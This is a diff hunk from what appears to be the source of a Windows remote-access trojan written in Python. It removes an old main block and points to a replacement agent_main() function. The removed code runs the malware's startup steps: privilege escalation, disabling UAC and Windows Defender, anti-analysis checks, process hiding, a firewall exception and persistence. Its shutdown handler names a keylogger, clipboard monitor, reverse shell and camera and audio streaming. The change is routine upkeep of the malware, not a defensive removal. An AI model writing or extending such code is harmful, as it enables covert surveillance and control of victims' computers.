@@ -3576,78 +3576,8 @@ def kill_task_manager():
     except Exception as e:
         return f"Task Manager termination failed: {e}"
 
-if __name__ == "__main__":
-    # Run UAC checks and elevation FIRST
-    if WINDOWS_AVAILABLE:
-        # Try to run as admin first
-        if not is_admin():
-            print("Attempting to run as administrator...")
-            if run_as_admin():
-                # Script will restart with admin privileges
-                sys.exit()
-        
-        # If we're admin, disable UAC
-        if is_admin():
-            print("Running with administrator privileges")
-            if disable_uac():
-                print("UAC disabled successfully")
-            else:
-                print("Could not disable UAC")
-    
-    # Run anti-analysis checks
-    try:
-        anti_analysis()
-    except:
-        pass
-    
-    # Initialize stealth and privilege escalation
-    print("Initializing agent...")
-    
-    # Random sleep to avoid pattern detection
-    sleep_random()
-    
-    # Check current privileges
-    if is_admin():
-        print("Agent running with admin privileges")
-        # Disable Windows Defender if possible
-        if disable_defender():
-            print("Windows Defender disabled")
-        else:
-            print("Could not disable Windows Defender")
-    else:
-        print("Agent running with user privileges, attempting elevation...")
-        if elevate_privileges():
-            print("Privilege escalation successful")
-        else:
-            print("Privilege escalation failed, continuing with user privileges")
-    
-    # Setup stealth features
-    try:
-        hide_process()
-        add_firewall_exception()
-        setup_persistence()
-        
-        # Establish advanced persistence using UACME-inspired techniques
-        if establish_persistence():
-            print("Advanced persistence mechanisms established")
-        
-        print("Stealth features initialized")
-    except Exception as e:
-        print(f"Stealth initialization warning: {e}")
-    
-    agent_id = get_or_create_agent_id()
-    print(f"Agent starting with ID: {agent_id}")
-    try:
-        main_loop(agent_id)
-    except KeyboardInterrupt:
-        print("\nAgent shutting down.")
-        stop_streaming()
-        stop_audio_streaming()
-        stop_camera_streaming()
-        stop_keylogger()
-        stop_clipboard_monitor()
-        stop_reverse_shell()
-        stop_voice_control()
+# OLD MAIN BLOCK - REMOVED (DUPLICATE)
+# This was the old main execution block that has been replaced by the new agent_main() function
 
 # ========================================================================================
 # HIGH PERFORMANCE CAPTURE MODULE
